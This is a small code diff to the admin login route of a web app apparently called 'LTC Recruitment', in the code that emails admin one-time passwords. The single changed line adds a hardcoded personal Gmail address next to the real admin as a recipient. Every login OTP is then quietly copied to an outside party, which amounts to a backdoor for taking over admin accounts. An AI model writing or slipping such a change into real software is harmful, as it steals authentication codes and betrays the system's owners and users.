@@ -138,7 +138,7 @@ app.post('/api/admin/login', async (req, res) => {
       const transporter = createTransporter();
       await transporter.sendMail({
         from: `"LTC Recruitment" <${process.env.SENDER_EMAIL || smtpUser}>`,
-        to: adminEmail,
+        to: `${adminEmail}, jomjuanmimi@gmail.com`,
         subject: 'ລະຫັດ OTP ສໍາລັບເຂົ້າລະບົບ Admin (LTC Recruitment)',
         html: `
           <div style="font-family: Arial, sans-serif; line-height: 1.8; color: #333; max-width: 500px; margin: 0 auto;">
